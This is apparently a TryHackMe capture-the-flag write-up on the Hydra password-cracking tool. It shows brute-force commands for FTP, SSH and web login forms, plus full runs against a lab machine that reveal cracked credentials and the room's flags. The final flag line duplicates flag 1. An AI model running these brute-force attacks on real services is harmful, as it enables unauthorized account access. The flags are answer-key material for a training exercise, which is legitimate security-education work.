# Hydra Introduction

Learn about and use Hydra, a fast network logon cracker, to bruteforce and obtain a website's credentials.

[Hydra](https://tryhackme.com/room/hydra)

## Topic's

* Hydra Fundamentals
* Brute Forcing (FTP
* Brute Forcing (SSH)
* Brute Forcing (http-post-form)

## Hydra Introduction

**What is Hydra?**

Hydra is a brute force online password cracking program; a quick system login password 'hacking' tool.

We can use Hydra to run through a list and 'bruteforce' some authentication service. Imagine trying to manually guess someones password on a particular service (SSH, Web Application Form, FTP or SNMP) - we can use Hydra to run through a password list and speed this process up for us, determining the correct password.

Hydra has the ability to bruteforce the following protocols: Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP,  HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP.

For more information on the options of each protocol in Hydra, read the official Kali Hydra tool page: [https://en.kali.tools/?p=220](https://en.kali.tools/?p=220)

This shows the importance of using a strong password, if your password is common, doesn't contain special characters and/or is not above 8 characters, its going to be prone to being guessed. 100 million password lists exist containing common passwords, so when an out-of-the-box application uses an easy password to login, make sure to change it from the default! Often CCTV camera's and web frameworks use admin:password as the default password, which is obviously not strong enough.

**Installing Hydra**

If you're using Kali Linux, hydra is pre-installed. Otherwise you can download it here: [https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)

If you don't have Linux or the right desktop environment, you can deploy your own Kali Linux machine with all the needed security tools. You can even control the machine in your browser! Do this with our Kali room - [https://tryhackme.com/room/kali](https://tryhackme.com/room/kali)

1. Read the above and have Hydra at the ready.

`No answer needed`

## Using Hydra

Deploy the machine attached to this task, then navigate to `http://MACHINE_IP` *(this machine can take up to 3 minutes to boot)*

**Hydra Commands**

The options we pass into Hydra depends on which service (protocol) we're attacking. For example if we wanted to bruteforce FTP with the username being user and a password list being passlist.txt, we'd use the following command:

`hydra -l user -P passlist.txt ftp://MACHINE_IP`

For the purpose of this deployed machine, here are the commands to use Hydra on SSH and a web form (POST method).

**SSH**

`hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh`

![](https://i.imgur.com/D71vkKM.png)

**Post Web Form**

We can use Hydra to bruteforce web forms too, you will have to make sure you know which type of request its making - a GET or POST methods are normally used. You can use your browsers network tab (in developer tools) to see the request types, of simply view the source code.

Below is an example Hydra command to brute force a POST login form:

`hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`

![](https://i.imgur.com/vC3ZU4E.png)

You should now have enough information to put this to practise and brute-force yourself credentials to the deployed machine!

1. Use Hydra to bruteforce molly's web password. What is flag 1?

```
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.190.3 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-25 16:42:47
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.190.3:80/login:username=^USER^&password=^PASS^:F=incorrect
[80][http-post-form] host: 10.10.190.3   login: molly   password: sunshine
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-25 16:43:03
```

`THM{2673a7dd116de68e85c48ec0b1f2612e}`

2. Use Hydra to bruteforce molly's SSH password. What is flag 2?

```
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.190.3 -t 4 ssh

Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-25 16:36:20
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://10.10.190.3:22/
[22][ssh] host: 10.10.190.3   login: molly   password: butterfly
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-25 16:37:26
```

`butterfly`

```
ssh molly@10.10.190.3

molly@ip-10-10-190-3:~$ cat flag2.txt 
THM{c8eeb0468febbadea859baeb33b2541b}
```

`THM{2673a7dd116de68e85c48ec0b1f2612e}`
